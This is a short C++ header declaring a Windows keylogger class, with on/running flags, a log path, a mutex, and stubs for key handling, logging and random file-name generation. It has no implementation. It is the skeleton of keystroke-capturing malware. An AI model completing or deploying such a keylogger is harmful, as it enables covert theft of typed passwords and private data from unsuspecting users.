#pragma once
#include <Windows.h>
#include <fstream>
#include <string>
#include <iostream>
#include <random> 
#include <vector>
#include <atomic>
#include <mutex>
#include <filesystem>
using namespace std;
class keylogger
{
    public:
    atomic<bool> keyloggerON=false;
    atomic<bool> keyloggerRunning=false;
    std::mutex mtx;
    std::string path;
    void Keylogger();
    bool IsPrintable(int key);
    bool HandleSpecialKey(int keyCode);
    void LOG(const string& input);
    std::string generate_random_string(size_t length);
};